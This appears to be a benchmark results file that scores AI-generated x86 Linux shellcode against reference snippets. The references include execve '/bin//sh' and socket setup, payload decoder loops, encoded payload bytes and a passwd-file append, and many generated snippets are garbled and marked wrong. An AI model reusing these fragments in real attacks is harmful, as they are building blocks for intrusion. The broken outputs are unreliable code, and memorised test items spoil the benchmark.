+marks dw 0, 0, 0, 0;for: dd 0x68732f \\n dd 0x68732f \\n dd 0x6e69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x6;GT: errorGenEXE
+push eax;push edx;GT: errorGenEXE
+sub eax, 0x013ffeff \\n push eax;push ' in/c';GT: errorGenEXE
+xor ebx, ebx \\n mov ebx, eax;xor ebx, ebx \\n mov eax, eax;GT: errorGenEXE
+pop esi;pop esi;1
+mov al, 102 \\n int 80h;push 0x68732f2f \\n push 0x6e69622f;GT: errorGenEXE
+push ebx;push ebx;1
+xchg ebx, ecx;xchg ecx, ebx;GT: errorGenEXE
+mov ecx,eax \\n push ecx;mov ecx, eax \\n push ecx;1
+add ax, bx;add ax, bx;1
+decode:;decode:;1
+push byte 0x77;push byte 0x77;1
+lea ebx, [esp];mov ebx, esp;GT: errorGenEXE
+push eax \\n push dword 0x64616568 \\n push dword 0x2f6e6962 \\n push dword 0x2f2f2f2f \\n push dword 0x7273752f;push 0-term \\n push daeh \\n push rsu/ on;0
+push ebx;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f;GT: errorGenEXE
+xor eax, 0xffffffff;xor 0xffffffff, 0xffffffff \\n xor eax, eax;0
+add al,0x3b;add al, 0x3b;1
+mov [esi], al;mov esi, al;0
+mov eax, 1;mov eax, 1;1
+xor ebx, ebx \\n push ebx;push edx;GT: errorGenEXE
+push eax \\n mov edx, esp \\n push ebx \\n mov ecx, esp \\n mov al, 0xb \\n int 0x80;int 0x80;GT: errorGenEXE
+entrypoint:;entrypoint:;1
+mov dl, 0x1c;mov dl, 0x1c;1
+sub byte [ebp+ecx],20h;sub ecx, 20h;GT: errorGenEXE
+push ecx;push ecx;1
+mov ebx, esp;mov ebx, esp;1
+mov edi, 0x3734b117;mov edi, 0x3734b117;1
+xor byte [esi + ecx - 1], 0x3;xor byte [esi + ecx - 1], bh;GT: errorGenEXE
+sub byte [esi], 13;sub byte [esi], 13;1
+push eax;push eax(socket;0
+mov edx, ecx;mov edx, esp;GT: errorGenEXE
+mov [ebx+8], ebx;mov [ebx + 8], ebx;1
+push 0x2 \\n pop ecx;push 0x2 \\n pop ecx;1
+lea edx, [esi+0x10];lea edx, [esi+0x10];1
+mov eax, 19;mov byte [esi], 0x68732f2f \\n mov byte [esi], 0x68732f \\n mov byte [esi], 0x6e69622f \\n mov byte [esi], 0x69622f \\n mov byte [esi], 0x69622f \\n mov byte [esi], 0x6e69622f \\n mov byte [esi], 0x69622f2f \\n mov byte [esi], 0x69622f;GT: errorGenEXE
+arr1 resb 400;push byte 0x68732f2f \\n push byte 0x68732f \\n push byte 0x6e69622f \\n push byte 0x69622f \\n push byte 0x69622f \\n push byte 0x69622f \\n push byte 0x69622f \\n mov uninitialized, esp;0
+xor cl, 0XAA \\n jz shift_decode;xor cl, 0xAA \\n jz shift_decode;GT: errorGenEXE
+nop;xor eax, 0x68732f2f \\n xor eax, 0x68732f \\n xor eax, 0x6e69622f \\n xor eax, 0x69622f \\n xor eax, 0x69622f \\n xor eax, 0x69622f \\n xor eax, 0x69622f \\n xor eax, 0x69622f2f \\n xor eax, 0x69622f2f \\n xor eax, 0x69622f;GT: errorGenEXE
+decoded_shellcode: \\n call [esp];decoded_shellcode: \\n call stack;GT: errorGenEXE
+mov eax, 90;mov eax, 0x68732f2f \\n mov eax, 0x68732f \\n mov eax, 0x6e69622f \\n mov eax, 0x69622f \\n mov eax, 0x69622f \\n mov eax, 0x69622f \\n mov eax, 0x6e69622f \\n mov eax, 0x69622f \\n mov eax, 0x69622f2f \\n mov eax, 0x69622f;GT: errorGenEXE
+cmp ax, bx \\n jne l3 \\n jmp while;cmp ax, bx \\n jne while;GT: errorGenEXE
+format:;format:;1
+mul ebx;mul ebx;1
+lea edi, [esi];push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov edi, esp;GT: errorGenEXE
+push edx;push edx;1
+L4: \\n jmp short esp;L4: \\n jmp short stack;GT: errorGenEXE
+push dword 0x8140a8c0;push dword 0x8140a8c0;1
+mov esi, 10;mov esi, 10;1
+jmp short setup;jmp short _setup;GT: errorGenEXE
+push 0x6e69622f \\n push 0x7273752f \\n mov ebx, esp;push 0x6e69622f \\n push 0x7273752f \\n mov ebx, esp;1
+hlt;xor until, until \\n sub until, 0x68732f2f \\n sub until, 0x6e69622f \\n xor until, 0x69622f \\n xor until, 0x69622f \\n xor until, 0x69622f \\n xor until, 0x69622f \\n xor until, 0x69622f \\n xor until, 0x69622f \\n xor until, 0x69622f \\n xor until, 0x;0
+mov eax, edx;mov eax, edx;1
+call _myfunc;call _myfunc;1
+sub byte [esi], 0xd;sub byte [esi], 0xd;1
+push edx;push edx;1
+cmp ecx, 5;cmp ecx, 5;1
+jns decode_pr;jns decode_pr;1
+zero1e:;_zero1e:;GT: errorGenEXE
+int 80h;call sys_read;GT: errorGenEXE
+push ecx \\n push 0x68736162 \\n push 0x2f6e6962 \\n push 0x2f2f2f2f;push ecx \\n push cotent \\n push 'hsab' \\n push '/nib' \\n push '////';0
+"call _appendfile \\n msg2 db ""passwd"", 0x00";inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc istruction \\n inc istruction \\n inc istruction \\n inc istruction \\n inc pf;0
+xor ecx, ecx \\n mul ecx;xor eax, eax \\n xor edx, edx;GT: errorGenEXE
+D2: \\n not byte [esi];D2: \\n not byte [esi];1
+mul ebx;xor eax, eax;GT: errorGenEXE
+_write:;_write:;1
+inc cl;inc cl \\n inc cl;GT: errorGenEXE
+mov esi, 0x353ffc3b;mov esi, 0x353ffc3b;1
+mov ecx, edx;mov ecx, edx;1
+inc ebx;inc ebx;1
+push 0x78;push 0x78;1
+mov ecx,esp;mov ecx, esp;1
+xor ah, ah;xor ah, ah;1
+_load_data:;_load_data:;1
+push ebx \\n push ebx \\n push esi;push ebx \\n push esi;GT: errorGenEXE
+test eax, eax \\n jnz checkforfile;test eax, eax \\n jz checkforfile;GT: errorGenEXE
+push edx;push edx;1
+mov cl,0x2;mov cl, 2;GT: errorGenEXE
+rol edx, 0x4;rol edx, 4;GT: errorGenEXE
+mov edi, ecx;mov edi, ecx;1
+mov edi, edx;mov edi, edi;GT: errorGenEXE
+xor ebx,eax;xor ebx, ebx \\n xor eax, eax;GT: errorGenEXE
+push byte 67 \\n pop eax;push byte 67 \\n pop eax;1
+mov esi, eax;mov esi, eax;1
+push ebx;push ebx;1
+mov dl, 0x02;mov dl, 0x02;1
+lea edi, [esi +1];mov edi, [esi];GT: errorGenEXE
+sub ebx, 0x2e2aa163;sub ebx, 0x2e2aa163;1
+xor bx, bx;xor bx, bx;1
+F2: \\n call function_1;F2: \\n call function1;GT: errorGenEXE
+xor ecx, ecx \\n mul ecx;xor ecx, ecx \\n mul ecx;1
+cmp al, 0xf2 \\n jz next_page;test efault, efault \\n jmp next_page;0
+int 0x80;init:;GT: errorGenEXE
+div edx;div edx;1
+mov eax, [x];mov eax, [x];1
+cmp eax, ebx \\n je all;cmp eax, ebx \\n jne all;GT: errorGenEXE
+my_table times 10 dw 0;push 0x68732f2f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov my_table, esp;0
+push 0x706d742f;push 0x706d742f;1
+mov ax, 1;mov ax, 1;1
+mov al, 5;mov al, 5;1
+scasd;cmp eax, dword [edi] \\n not dword [edi];GT: errorGenEXE
+ret;pop that;0
+mov al, dl;mov al, dl;1
+sub [var2], esi;sub var2, esi;0
+sub ecx, 23;sub ecx, 23;1
+push edi \\n mov eax, esp;push edi \\n mov eax, esp;1
+test eax, eax \\n jz write \\n xor eax, eax;test eax, eax \\n jz write;GT: errorGenEXE
+lea ebx, [edx+0x4];mov ebx, edx+0x4;0
+cmp [ebp+var_a], 0;cmp [ebp+var_a], 0;1
+inc ebx \\n push ebx;push 1;GT: errorGenEXE
+word1 word 65535;word1: db 65535;GT: errorGenEXE
+sub cx, cx;sub cx, cx;1
+mov ebx, 4;mov eax, 0x68732f2f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x6e69622f \\n int 0x6e69622f \\n int 0x6e69622f \\n int 0x;GT: errorGenEXE
+incpage:;incpage:;1
+push word 0x632d \\n mov edi, esp;push word 0x632d \\n mov edi, esp;1
+push ecx;push ecx;1
+test eax, eax \\n js _while_loop;test eax, eax \\n jns _while_loop;GT: errorGenEXE
+mov ecx,esp;mov ecx, esp;1
+cmp dword ptr [eax],edx \\n jne loop;edx: \\n dword ptr 0x68732f2f \\n dword ptr 0x68732f \\n dword ptr 0x6e69622f \\n dword ptr 0x69622f \\n dword ptr 0x69622f \\n dword ptr 0x69622f \\n dword ptr 0x69622f \\n dword ptr 0x69622f \\n dword ptr 0x69622f \\n dword ptr 0x69622f \\n dword ptr 0x696;0
+jne encodedshellcode;jz _encodedshellcode;GT: errorGenEXE
+me:;me:;1
+push ebx;push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f;GT: errorGenEXE
+cld;xor ecx, ecx \\n mul ecx;GT: errorGenEXE
+sub eax, ebx;sub eax, ebx;1
+mov bl,0x3;push 0x3 \\n pop bl;0
+cmp al, 0xf2 \\n jz _start;cmp al, 0xf2 \\n jge _start;GT: errorGenEXE
+lea ecx, [esi + 8];lea ecx, [esi+8];1
+xor ebx, ebx;xor ebx, ebx;1
+mov ax, 1666;mov ax, 1666;1
+mov ebx, esp;mov ebx, esp;1
+push dword 0x61722f6c;push dword 0x61722f6c;1
+cmp cl, 0x11 \\n jb 0xff \\n add dl, 0x5;cmp cl, 0x11 \\n jl 0xff \\n add dl, 0x5;GT: errorGenEXE
+loop l4 \\n mov edx, esp;loop l4 \\n mov edx, esp;1
+mov cl, 4;mov cl, 4;1
+loop decode \\n jmp Shellcode;loop decode \\n jmp Shellcode;1
+xchg eax, ebx;xchg eax, ebx;1
+cmp byte [esi], 0xD \\n jl wrap_around;cmp byte [esi], 0xD \\n jl wrap_around;1
+mov byte [esi + 1], dl;mov [esi+1], dl;GT: errorGenEXE
+mov al, 0x3f;push 63 \\n pop 63;0
+push 0xdebf;push 0xdebf;1
+section .text;section;GT: errorGenEXE
+mov al, 15;mov byte [eax], 15;GT: errorGenEXE
+push eax;push edx;GT: errorGenEXE
+push dword 0x2f2f2f2f \\n push dword 0x7273752f \\n mov ebx, esp;push dword 0x2f2f2f2f \\n push dword 0x7273752f \\n mov ebx, esp;1
+lea ecx, [esp];mov ecx, esp;GT: errorGenEXE
+push 0x69622f3a;push 0x69622f3a;1
+push eax;push eax;1
+mov eax, msg1;mov eax, msg1;1
+lea ecx, [zero_reg+117];push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov ecx, esp;GT: errorGenEXE
+mov dword [esp-0x24], 0x732f636f;mov dword [0x732f636f], 0x732f636f;GT: errorGenEXE
+push 0x6873732f \\n push 0x6374652f \\n mov edx, esp;push 0x6873732f \\n push 0x6374652f \\n mov edx, esp;1
+inc esi;inc esi;1
+mov esi, eax;mov esi, eax;1
+shr ax, cl;cmp ax, cl;0
+cmp eax, ebx;cmp ebx, eax;GT: errorGenEXE
+section .text \\n _start:;section .data, _start;GT: errorGenEXE
+dec byte dl;dec dl;GT: errorGenEXE
+jmp callpop;jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero6e69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f;GT: errorGenEXE
+mov eax, 2;mov eax, 0x68732f2f \\n mov eax, 0x6e69622f;GT: errorGenEXE
+sub esp, 0x7f;sub 0x7f, 0x7f;0
+push 0x706d742f;push 0x706d742f;1
+xor byte [esi], 0x97;xor byte [esi], 0x97;1
+mov al, 0x5;mov al, 0x68732f2f \\n mov al, 0x6e69622f;GT: errorGenEXE
+inc ebx;inc ebx;1
+mul ebx;xor eax, eax;GT: errorGenEXE
+mov ax, 0x16b;push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n mov ax, esp;0
+xor eax,eax \\n xor ebx,ebx;xor eax, eax \\n xor ebx, ebx;1
+push 0x706d742f;push 0x706d742f;1
+push word 0x1b6 \\n pop ecx;mov ecx, read-write;0
+loop fill;loop ecx \\n xor var1, var1 \\n xor unless, unless \\n xor decrementing, decrementing;0
+push dword eax;push dword eax;1
+shellcode:;shellcode:;1
+neg eax;not eax;GT: errorGenEXE
+mov dword [esp-12], 0x6374652f;mov dword [[], 0x6374652f;0
+push 0x7461632f \\n push 0x6e69622f \\n mov edx, esp;push 0x7461632f \\n push 0x6e69622f \\n mov edx, esp;1
+push 0x04020a0a;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f;GT: errorGenEXE
+mul [var];mul 32-bit;0
+lea ebx, [ebp+39];push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov ebx, esp;GT: errorGenEXE
+mov rcx, 0x68732f2f6e69622f;push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n mov rcx, esp;0
+mov cx, 0x401;mov cx, 0x401;1
+cmp bh, al;cmp bh, al;1
+push 0x7665642f;push 0x7665642f;1
+jmp short shellcode_section;jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero6e69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f;GT: errorGenEXE
+ja write;jge write;GT: errorGenEXE
+mov ecx, 4294948047;mov ecx, 4294948047;1
+mov al, 0x2e;push setgid \\n pop = \\n pop 0x2e;0
+mov ecx, esp;push trasnfer \\n pop ecx;GT: errorGenEXE
+jmp short stage;jmp short stage;1
+je short loc_402b13;cmp loc_402b13, loc_402b13 \\n je loc_402b13;0
+pop ebx;push byte 0x68732f2f \\n push byte 0x6e69622f \\n push byte 0x69622f \\n push byte 0x69622f \\n push byte 0x69622f \\n mov ebx, esp;GT: errorGenEXE
+mov ecx, esp;pop ecx;GT: errorGenEXE
+mov eax, 0x50905090;push byte 0x50905090 \\n push 0x50905090 \\n push 0x50905090 \\n push 0x50905090 \\n push 0x50905090 \\n push 0x50905090 \\n push 0x50905090 \\n push 0x509050905090 \\n push 0x509050905090 \\n push 0x509050905090 \\n push 0x509050905090 \\n push 0x5090509050905090 \\n push 0x5090;GT: errorGenEXE
+push byte 0x1 \\n pop edx;push byte 0x1 \\n pop edx;1
+shellcode: db 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23;shellcode: db 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23;1
+pop ecx;pop ecx;1
+jmp nextchar;jmp code;GT: errorGenEXE
+jz download;jz download;1
+push 0x3 \\n pop ebx;push sys_connect \\n pop = \\n pop ebx;0
+mov esi, esp;mov esi, esp;1
+cmp eax,ebx \\n je exit;cmp eax, ebx \\n je _exit;GT: errorGenEXE
+push dword eax;push dword eax;1
+add byte [esi], 0x02;add byte [esi], 0x02;1
+mov [ebp+20], zero_reg;mov zero_reg, [[];0
+push edx \\n push esi \\n push edi \\n push ebx \\n mov ecx, esp;push edx \\n push esi \\n push edi \\n push ebx \\n mov ecx, esp;1
+pop eax;pop eax;1
+zero1b:;_zero1b:;GT: errorGenEXE
+mov eax, 65;mov eax, 0x68732f2f \\n int 0x68732f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f;GT: errorGenEXE
+jmp short formatting;jmp short formatting;1
+xchg ebx,eax;xchg ebx, eax;1
+jmp edi;jmp edi;1
+xor edx, edx \\n mul edx;xor eax, eax \\n mul eax;GT: errorGenEXE
+xor ax, 0x539;xor ax, 0x539;1
+sub eax, 8;sub eax, 8;1
+push 0x61622f6e;push 0x61622f6e;1
+push dx;push dx;1
+mov ecx,esp;mov ecx, esp;1
+notdecode:;notdecode:;1
+jmp read;jmp read;1
+push word 0x776f;push word 0x776f;1
+push 0x68732f2f \\n push 0x68732f2f \\n push 0x2f656c2d;push ' -le///sh//sh';GT: errorGenEXE
+child:;child:;1
+mov edx, response;mov edx, response;1
+scasd \\n l1 IncAddr;cmp DWORD [eax], edi \\n jne l1;GT: errorGenEXE
+mov esi, 0x353ffc3b;mov esi, 0x353ffc3b;1
+_ip equ 0x0100007f;ip equ 0x0100007f;GT: errorGenEXE
+lea edx, [ebx+12];lea edx, [ebx+12];1
+pop esi;mov esi, word [esi];0
+xor eax, eax \\n xor ebx, ebx \\n xor ecx, ecx \\n xor edx, edx;xor eax, eax \\n xor ebx, ebx \\n xor ecx, ecx \\n xor edx, edx;1
+add edx, 32;add edx, 32;1
+xor eax, eax \\n mov ebx, eax \\n mov ecx, eax \\n mov edx, eax;xor eax, eax \\n xor ebx, ebx \\n xor ecx, ecx \\n xor edx, edx;GT: errorGenEXE
+mov byte [esi + 1], dl;mov dl, byte [esi+1];GT: errorGenEXE
+push 0xb \\n pop eax;push __nr_execve \\n pop eax;GT: errorGenEXE
+or eax, 0xffffffff \\n not eax \\n push eax;mov eax, value -1 \\n not eax;GT: errorGenEXE
+mov bl, 3 \\n dec bl \\n jnz l3;mov bl, 3 \\n dec bl \\n jnz l3;1
+call decoder \\n shellcode: db 0x62,0x60,0xa0,0x34,0x5e,0x97,0xe6,0x34,0xd0,0x97,0xc4,0xb4,0xdc,0xc4,0xc7,0x28,0x13,0x71,0xa6,0xc4,0xc3,0x58,0x16,0xe6,0x01;jmp shellcode;GT: errorGenEXE
+mov al, 0x8;push byte 0x8 \\n pop 0x8;0
+shr bl, 4;shr bl, 4;1
+push 0x746f6f72;push 0x746f6f72;1
+xor eax, eax \\n mov al, 6;xor eax, eax \\n mov numebr, esp;0
+ja exi;jge exi;GT: errorGenEXE
+mov ecx, 0x1;mov ecx, 0x1;1
+mov eax, [ebx+esi*2+4];mov eax, [ebx+esi*2+4];1
+_start: \\n jmp short call_shellcode;_start: \\n jmp short call_shellcode;1
+mov edx, dword 0x65676760;mov edx, 0x65676760;GT: errorGenEXE
+xor ecx, ecx;xor ecx, ecx;1
+sub eax, 3;dec eax;GT: errorGenEXE
+_file:;_file_label:;GT: errorGenEXE
+int 0x80;int 80h;GT: errorGenEXE
+push dword 0x3a303a3a;push dword 0x3a303a3a;1
+cmp BYTE al, 2 \\n je do_inject;cmp al, 2 \\n jne do_inject;GT: errorGenEXE
+movq mm3, qword [esi];mov mm3, \shellcode\;0
+je exit;jne exit;GT: errorGenEXE
+mov byte [edi], bl;mov byte [edi], bl;1
+xchg edi,eax;xchg edi, eax;1
+push eax \\n mov edx,esp;"push edx \\n push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x
+";GT: errorGenEXE
